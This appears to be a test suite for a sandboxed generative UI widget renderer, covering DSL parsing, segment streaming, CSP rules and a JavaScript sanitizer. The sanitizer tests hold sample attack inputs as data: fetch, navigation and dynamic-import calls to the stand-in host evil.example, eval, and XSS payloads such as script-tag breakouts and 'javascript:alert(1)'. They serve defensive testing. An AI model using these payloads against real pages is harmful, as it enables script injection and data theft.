import { describe, expect, test } from "bun:test";
import { readFileSync } from "fs";
import path from "path";
import {
  parseGenerativeUiDsl,
  splitGenerativeUiSegments,
  withGenerativeUiSegmentIds,
  hasWidgetBody,
} from "../web/src/indirect-code/components/generative-ui/dsl";
import {
  clampFrameHeight,
  MIN_FRAME_HEIGHT,
  MAX_FRAME_HEIGHT,
} from "../web/src/indirect-code/components/generative-ui/bridge";
import {
  WIDGET_BASE_CSS,
  escapeScriptClose,
  escapeStyleClose,
  sanitizeModelJS,
  widgetCSP,
  buildRuntimeScript,
  buildJsxImportMap,
  buildJsxModuleBody,
  buildWidgetDocument,
  makeScriptNonce,
} from "../web/src/indirect-code/components/generative-ui/widget-doc";

describe("parseGenerativeUiDsl", () => {
  test("parses headers and the @jsx source body", () => {
    const body = [
      "placeholder: Building your savings projection",
      `state: {"amount": 1000, "years": 5}`,
      "",
      "@jsx",
      'import { useState } from "react";',
      "export default function App() { return <div className=\"gu-root\">hi</div>; }",
    ].join("\n");
    const d = parseGenerativeUiDsl(body);
    expect(d.placeholder).toBe("Building your savings projection");
    expect(d.state).toEqual({ amount: 1000, years: 5 });
    expect(d.jsx).toContain('import { useState } from "react";');
    expect(d.jsx).toContain('return <div className="gu-root">hi</div>;');
  });

  test("the @jsx body is verbatim — later lines are never re-parsed", () => {
    const d = parseGenerativeUiDsl(
      ["@jsx", "const s = 1;", "placeholder: not a header", "@html", "const t = 2;"].join("\n"),
    );
    expect(d.jsx).toBe("const s = 1;\nplaceholder: not a header\n@html\nconst t = 2;");
    expect(d.placeholder).toBeUndefined();
  });

  test("partial state JSON during streaming is dropped safely", () => {
    const d = parseGenerativeUiDsl('state: {"amount": 10');
    expect(d.state).toBeUndefined();
  });

  test("streams partial source (no closing fence yet)", () => {
    const d = parseGenerativeUiDsl('@jsx\nexport default function App() { return <div class="gu-ro');
    expect(d.jsx).toContain('<div class="gu-ro');
    expect(hasWidgetBody(d)).toBe(true);
    expect(hasWidgetBody({})).toBe(false);
  });

  test("@tsx is accepted as a silent alias of @jsx (source is always TSX)", () => {
    const d = parseGenerativeUiDsl("@tsx\nexport default function App() { return <div />; }");
    expect(d.jsx).toContain("export default function App");
    expect(hasWidgetBody(d)).toBe(true);
  });


  test("the libs header is gone: imports declare the libs", () => {
    // A `libs:` line (legacy) is ignored like any unknown key — the import
    // map always maps every vendored lib and the browser only fetches what
    // the module actually imports.
    const d = parseGenerativeUiDsl("libs: d3, three\n@jsx\nconst a = 1;");
    expect(d.jsx).toBe("const a = 1;");
    expect("libs" in d).toBe(false);
  });

  test("unknown header keys do not crash the parser", () => {
    const d = parseGenerativeUiDsl("color: red\n@jsx\nconst a = 1;");
    expect(d.jsx).toContain("const a = 1;");
    expect(d.placeholder).toBeUndefined();
  });
});

describe("splitGenerativeUiSegments", () => {
  test("splits markdown and widget runs", () => {
    const text = [
      "Here is the answer:",
      "",
      "```generative_ui",
      "placeholder: My widget",
      "@jsx",
      "export default function App() { return <div>x</div>; }",
      "```",
      "",
      "And the conclusion.",
    ].join("\n");
    const segs = splitGenerativeUiSegments(text);
    expect(segs.length).toBe(3);
    expect(segs[0].kind).toBe("md");
    expect(segs[1].kind).toBe("widget");
    expect(segs[1].kind === "widget" && segs[1].closed).toBe(true);
    expect(segs[1].kind === "widget" && segs[1].body).toContain("<div>x</div>");
    expect(segs[2].kind).toBe("md");
  });

  test("keeps other code fences inside markdown runs", () => {
    const text = "intro\n\n```js\nconst a = 1;\n```\n\noutro";
    const segs = splitGenerativeUiSegments(text);
    expect(segs.length).toBe(1);
    expect(segs[0].kind).toBe("md");
    expect(segs[0].kind === "md" && segs[0].text).toContain("```js");
  });

  test("open fence at stream end becomes an unclosed widget segment", () => {
    const text = "before\n\n```generative_ui\nplaceholder: Loading thing\n@jsx\nexport default function App() { return <div class=\"gu-ro";
    const segs = splitGenerativeUiSegments(text);
    const widget = segs.find((s) => s.kind === "widget");
    expect(widget).toBeTruthy();
    expect(widget!.kind === "widget" && widget!.closed).toBe(false);
    expect(widget!.kind === "widget" && widget!.body).toContain("@jsx");
  });

  test("genui alias works", () => {
    const segs = splitGenerativeUiSegments("```genui\n@jsx\nconst a = 1;\n```");
    expect(segs[0].kind).toBe("widget");
  });

  test("longer fence (4 ticks) closes correctly", () => {
    const segs = splitGenerativeUiSegments("````generative_ui\n@jsx\nconst a = 1;\n````\ndone");
    expect(segs[0].kind).toBe("widget");
    expect(segs[0].kind === "widget" && segs[0].closed).toBe(true);
    expect(segs[1].kind === "md" && segs[1].text).toBe("done");
  });
});

describe("bridge clamps", () => {
  test("clamps reported heights", () => {
    expect(clampFrameHeight(320)).toBe(320);
    expect(clampFrameHeight(0)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(999999)).toBe(MAX_FRAME_HEIGHT);
    expect(clampFrameHeight(NaN)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(-5)).toBe(MIN_FRAME_HEIGHT);
    expect(clampFrameHeight(120.7)).toBe(121);
  });
});

describe("widget document sanitizers", () => {
  test("escapeScriptClose neutralizes script closers in any shape", () => {
    expect(escapeScriptClose("</script>")).toBe("<\\/script>");
    expect(escapeScriptClose("x < / ScRiPt y")).not.toMatch(/<\s*\/?\s*script/i);
    expect(escapeScriptClose("<script>alert(1)</script>"))
      .not.toMatch(/<\s*\/?\s*script/i);
  });

  test("escapeStyleClose neutralizes style closers (lib css)", () => {
    expect(escapeStyleClose(".a{}</style><script>x</script>"))
      .not.toMatch(/<\s*\/\s*style/i);
  });

  test("sanitizeModelJS strips forbidden capabilities but keeps ESM", () => {
    const js = [
      "import { a } from 'b';",
      "const x = 1;",
      "fetch('https://evil.example');",
      "location.href = 'https://evil.example';",
      "eval('1+1');",
      "new Function('return 1');",
      "document.getElementById('a').textContent = 'ok';",
    ].join("\n");
    const clean = sanitizeModelJS(js);
    expect(clean).toContain("const x = 1;");
    expect(clean).toContain("textContent = 'ok'");
    // Static imports are the widget module format — validated at compile
    // time against the import map, never stripped here (astring output
    // normalizes the braces: `import {a} from 'b';`).
    expect(clean).toContain("import {a} from 'b';");
    for (const bad of ["fetch(", "location.href", "eval(", "new Function("]) {
      expect(clean).not.toContain(bad);
    }
  });

  test("sanitizeModelJS treats string literals as data, never as code", () => {
    // The regex-era bug: a benign string that merely LOOKS like a call got
    // cut line-wise. With the AST pipeline literals are data.
    const js = 'const sample = "eval(1) fetch(x) window.location = 1";';
    const clean = sanitizeModelJS(js);
    expect(clean).toContain('eval(1) fetch(x) window.location = 1');
  });

  test("sanitizeModelJS strips HTML injection sinks structurally", () => {
    const cases: [string, string][] = [
      ["el.innerHTML = '<b>x</b>';", "innerHTML"],
      ["el.outerHTML = '<b>x</b>';", "outerHTML"],
      ["el.insertAdjacentHTML('beforeend', '<b>x</b>');", "insertAdjacentHTML"],
      ["document.write('<b>x</b>');", "document.write"],
      ["el.setAttribute('onclick', 'alert(1)');", "setAttribute('onclick'"],
      ["React.createElement('a', { href: 'javascript:alert(1)' });", "javascript:"],
      ["React.createElement('div', { dangerouslySetInnerHTML: { __html: '<b>x' } });", "dangerouslySetInnerHTML"],
    ];
    for (const [src, marker] of cases) {
      const clean = sanitizeModelJS(src);
      expect(clean, src).not.toContain(marker);
    }
    // Benign attribute writes are NOT sinks and survive.
    const benign = sanitizeModelJS("el.setAttribute('data-x', '1');");
    expect(benign).toContain("setAttribute('data-x', '1')");
  });

  test("sanitizeModelJS allows esm.sh dynamic imports only when opted in", () => {
    const esm = 'import("https://esm.sh/canvas-confetti@1").then((m) => m.default());';
    const other = 'import("https://evil.example/x.js").then(() => {});';
    const statik = 'import confetti from "https://esm.sh/canvas-confetti@1";';
    // The literal esm.sh dynamic import always survives (the one allowed
    // lib CDN; a static import of a URL is a compile error, caught earlier
    // by jsx-compile). Output is astring-normalized (arrow parens drop).
    const clean = sanitizeModelJS([esm, other, statik].join("\n"));
    expect(clean).toContain('import("https://esm.sh/canvas-confetti@1")');
    expect(clean).toContain("m.default()");
    expect(clean).not.toContain("evil.example");
    // Static imports are kept (the module format) — only dynamic foreign
    // imports are stripped.
    expect(clean).toContain("import confetti");
  });

  test("sanitizeModelJS strips navigation by assignment and history writes", () => {
    const js = [
      "const total = 1;",
      "location = 'https://evil.example';",
      "window.location = 'https://evil.example';",
      "window.location.assign('https://evil.example');",
      "top.location.replace('https://evil.example');",
      "history.pushState({}, '', 'https://evil.example');",
      "window.React = 1;",
      "const keep = window.__gu.state;",
    ].join("\n");
    const clean = sanitizeModelJS(js);
    expect(clean).toContain("const total = 1;");
    // Reading globals is supported (window.__gu.state, window.indirectUi);
    // assigning them is pollution and is stripped.
    expect(clean).toContain("window.__gu.state");
    for (const bad of ["location =", "window.location =", "pushState", "window.React =", "location.assign", "location.replace"]) {
      expect(clean).not.toContain(bad);
    }
  });

  test("buildRuntimeScript exposes the documented indirectUi surface", () => {
    const script = buildRuntimeScript({ stateJSON: "{}" });
    for (const fn of ["sendPrompt", "prefillPrompt", "openLink", "resize"]) {
      expect(script).toContain(`${fn}: function`);
    }
  });

  test("buildRuntimeScript wraps model js in a try/catch", () => {
    const script = buildRuntimeScript({ stateJSON: '{"a":1}' });
    expect(script).toContain("window.__gu");
    expect(script).toContain("$render");
    expect(script).toContain("$onDestroy");
    expect(script).toContain("pagehide");
  });

  test("buildJsxModuleBody appends the auto-mount to the compiled ESM", () => {
    const body = buildJsxModuleBody("export default function App() {}");
    expect(body).toContain("export default function App() {}");
    expect(body).toContain("window.ReactDOMClient.createRoot(document.body)");
    expect(body).toContain("window.React.createElement(__app");
    // No eval and no CJS leftovers: the sandbox CSP has no 'unsafe-eval'.
    expect(body).not.toContain("eval(");
    expect(body).not.toContain("require(");
    expect(body).not.toContain("module.exports");
  });

  test("buildJsxImportMap resolves the react surface and the vendored libs", () => {
    const map = JSON.parse(buildJsxImportMap({
      react: "/api/indirect-code/gen-ui/lib/react-shim.js",
      libs: { d3: "/api/indirect-code/gen-ui/lib/d3.js", chart: "/api/indirect-code/gen-ui/lib/chart.js" },
    }));
    expect(map.imports).toEqual({
      react: "/api/indirect-code/gen-ui/lib/react-shim.js",
      "react/jsx-runtime": "/api/indirect-code/gen-ui/lib/react-shim.js",
      "react/jsx-dev-runtime": "/api/indirect-code/gen-ui/lib/react-shim.js",
      "react-dom": "/api/indirect-code/gen-ui/lib/react-shim.js",
      "react-dom/client": "/api/indirect-code/gen-ui/lib/react-shim.js",
      d3: "/api/indirect-code/gen-ui/lib/d3.js",
      chart: "/api/indirect-code/gen-ui/lib/chart.js",
      "chart.js": "/api/indirect-code/gen-ui/lib/chart.js",
      "chart.js/auto": "/api/indirect-code/gen-ui/lib/chart.js",
    });
  });

  test("widget CSP is locked down: sandboxed, network limited to data + esm.sh", () => {
    const csp = widgetCSP("abc", "https://gw.test");
    expect(csp).toContain("sandbox allow-scripts");
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'nonce-abc'");
    // The served widget modules (lib + stored module) are the only script
    // sources besides the nonce and the one allowed lib CDN (esm.sh). CSP
    // requires ABSOLUTE sources — paths are invalid and 'self' matches
    // nothing in the opaque sandbox origin — so they carry the origin.
    expect(csp).toContain("https://gw.test/api/indirect-code/gen-ui/lib/");
    expect(csp).toContain("https://gw.test/api/indirect-code/gen-ui/modules/");
    expect(csp).toContain("https://esm.sh");
    // fetch/XHR/WebSocket lines are stripped from model code
    // (sanitizeModelJS); https connects cover the esm.sh module graph and
    // map data. No wildcard origins anywhere.
    expect(csp).toContain("connect-src https:");
    expect(csp).not.toContain("connect-src *");
    expect(csp).toContain("frame-ancestors 'self'");
    // Images may load from any http(s) site.
    expect(csp).toContain("img-src data: blob: https: http:");
    const scriptSrc = csp.split(";").map((s: string) => s.trim()).find((s: string) => s.startsWith("script-src")) || "";
    expect(scriptSrc).not.toContain("unsafe-inline");
    expect(scriptSrc).not.toContain("unsafe-eval");
  });

  test("buildWidgetDocument keeps every inline script nonce'd and model-free", () => {
    const doc = buildWidgetDocument({
      theme: "dark",
      moduleUrl: "/api/indirect-code/gen-ui/modules/abc",
      importMap: buildJsxImportMap({ react: "/api/indirect-code/gen-ui/lib/react-shim.js", libs: {} }),
      stateJSON: "{}",
      scriptNonce: makeScriptNonce(),
      origin: "https://gw.test",
    });
    // The model lives in the served module: the document only carries the
    // runtime, the bridge and the module reference.
    expect(doc).toContain('<script type="module" src="/api/indirect-code/gen-ui/modules/abc"');
    // Every inline script (runtime + bridge + import map) is nonce'd; the
    // module reference is external (src=).
    const outsideStyles = doc.replace(/<style>[\s\S]*?<\/style>/g, "");
    const inline = (outsideStyles.match(/<script\b[^>]*>/g) || []).filter((t) => !t.includes("src="));
    const nonces = outsideStyles.match(/<script[^>]*nonce=/g) || [];
    expect(inline.length).toBe(nonces.length);
    // runtime + bridge + import map
    expect(inline.length).toBe(3);
  });

  test("buildJsxModuleBody never lets model code close its element", () => {
    const body = buildJsxModuleBody('var s = "</script><script>window.evil=1</script>";');
    expect(body).not.toContain("</script>");
    expect(body).toContain("<\\/script");
  });
});

describe("widget design system", () => {
  test("base CSS mirrors the host card surfaces in both themes", () => {
    // Light card / dark card from web/style.tailwindcss.css: the widget
    // surface is the host card color so the frame seam stays invisible.
    expect(WIDGET_BASE_CSS).toContain("--gu-bg: #fafbfc");
    expect(WIDGET_BASE_CSS).toContain("--gu-bg: #1b1e21");
    expect(WIDGET_BASE_CSS).toContain("--gu-elev: #24272b");
  });

  test("base CSS ships the curated chart palette and composed controls", () => {
    for (const token of ["--gu-chart-1", "--gu-chart-2", "--gu-chart-3", "--gu-chart-4", "--gu-chart-5"]) {
      expect(WIDGET_BASE_CSS).toContain(token);
    }
    for (const cls of [".gu-header", ".gu-segmented", ".gu-choice", ".gu-stage", ".gu-table-wrap", ".gu-card.is-selected"]) {
      expect(WIDGET_BASE_CSS).toContain(cls);
    }
    // Custom slider (thin track + thumb), not bare accent-color.
    expect(WIDGET_BASE_CSS).toContain("::-webkit-slider-thumb");
    expect(WIDGET_BASE_CSS).toContain("::-moz-range-thumb");
    // Tables never zebra-stripe.
    expect(WIDGET_BASE_CSS).toContain("tbody tr:nth-child(even) { background: transparent; }");
  });

  test("button variant classes are self-contained, not modifiers of .gu-btn", () => {
    // The docs present gu-btn-primary / gu-btn-ghost / gu-btn-sm as standalone
    // classes ("gu-btn-primary (the ONE main action)"), so a lone
    // `class="gu-btn-primary"` must carry the full button chrome — otherwise
    // it renders as an unstyled native button.
    expect(WIDGET_BASE_CSS).toMatch(/\.gu-btn, \.gu-btn-primary, \.gu-btn-ghost, \.gu-btn-sm \{/);
    // Interaction states must cover the standalone classes too.
    for (const state of [":hover", ":active", ":focus-visible", ":disabled"]) {
      expect(WIDGET_BASE_CSS).toContain(".gu-btn" + state);
      expect(WIDGET_BASE_CSS).toContain(".gu-btn-primary" + state);
      expect(WIDGET_BASE_CSS).toContain(".gu-btn-ghost" + state);
      expect(WIDGET_BASE_CSS).toContain(".gu-btn-sm" + state);
    }
  });

  test("runtime auto-fits height and syncs slider fill", () => {
    const script = buildRuntimeScript({ stateJSON: "{}" });
    expect(script).toContain("ResizeObserver");
    expect(script).toContain("MutationObserver");
    expect(script).toContain('setProperty("--p"');
    // Attribute watching is limited to the src filter (image proxy
    // rewrite): slider fill writes and per-frame animation styles would
    // self-trigger any wider attribute observer into a loop.
    // Remote images are rewritten through the gateway image proxy.
    expect(script).toContain("/api/indirect-code/gen-ui/img?u=");
    expect(script).toContain("data-gu-orig");
    expect(script).toContain('attributeFilter: ["src"]');
    expect(script).not.toContain('attributeFilter: ["style"');
    expect(script).not.toContain('attributeFilter: ["class"');
    // Uncaught widget errors are reported to the host error footer.
    expect(script).toContain("unhandledrejection");
    expect(script).toContain('addEventListener("error"');
  });
});

describe("streaming segment stability (no per-token remount)", () => {
  const FULL = [
    "Here is a savings calculator for you.",
    "",
    "```generative_ui",
    "placeholder: Building your savings projection",
    "@jsx",
    'export default function App() { return <div className="gu-root">Hi</div>; }',
    "```",
    "",
    "Adjust the slider to explore.",
  ].join("\n");

  test("segment ids are stable while tokens append", () => {
    // Simulate token streaming over prefix slices. The reconciled store in
    // StreamingMarkdown keys by these ids; an id that changes for an
    // already-mounted segment remounts its TarnavMarkdown/widget instance.
    const seenKindById = new Map<string, "md" | "widget">();
    let previousIds: string[] = [];
    for (let n = 8; n <= FULL.length + 8; n += 8) {
      const segs = withGenerativeUiSegmentIds(
        splitGenerativeUiSegments(FULL.slice(0, Math.min(n, FULL.length))),
      );
      const ids = segs.map((s) => s.id);
      // Ids are unique within a step and never change kind once seen.
      expect(new Set(ids).size).toBe(ids.length);
      for (const seg of segs) {
        const before = seenKindById.get(seg.id);
        if (before !== undefined) expect(seg.kind).toBe(before);
        seenKindById.set(seg.id, seg.kind);
      }
      // Every id present in both steps survives in place (no churn).
      for (const id of previousIds) {
        if (seenKindById.has(id) && ids.includes(id)) {
          expect(ids.indexOf(id)).toBe(previousIds.indexOf(id));
        }
      }
      previousIds = ids;
    }
    expect(previousIds).toEqual(["s0:md", "s1:widget", "s2:md"]);
  });

  test("transcript markdown renders through a reconciled store, memoized parse", () => {
    const root = path.join(import.meta.dir, "..");
    const streaming = readFileSync(
      path.join(root, "web/src/indirect-code/components/StreamingMarkdown.tsx"),
      "utf8",
    );
    // Regression: <For each={segments()}> over freshly split objects
    // remounted the stateful TarnavMarkdown parser on every token.
    expect(streaming).toContain("createStore");
    expect(streaming).toContain("reconcile(");
    expect(streaming).not.toContain("each={segments()}");
    // Basic mode (thinking disclosures) never mounts widgets.
    expect(streaming).toContain("if (props.basic)");
    const renderer = readFileSync(
      path.join(root, "web/src/indirect-code/components/generative-ui/renderer.tsx"),
      "utf8",
    );
    expect(renderer).toContain("createMemo<GenerativeUiData>");
    expect(renderer).not.toContain("const data = (): GenerativeUiData =>");
    // Centered loading state + error footer that pastes a report (ref +
    // placeholder + message) into the composer without sending it.
    expect(renderer).toContain("place-items-center");
    expect(renderer).toContain("mb-3");
    expect(renderer).toContain("Ask to fix");
    expect(renderer).toContain("onPrefillPrompt");
    expect(streaming).toContain("onPrefillPrompt");
    const bridge = readFileSync(
      path.join(root, "web/src/indirect-code/components/generative-ui/bridge.ts"),
      "utf8",
    );
    expect(bridge).toContain('data.__gu !== "error"');
    expect(bridge).toContain("onError");
  });
});
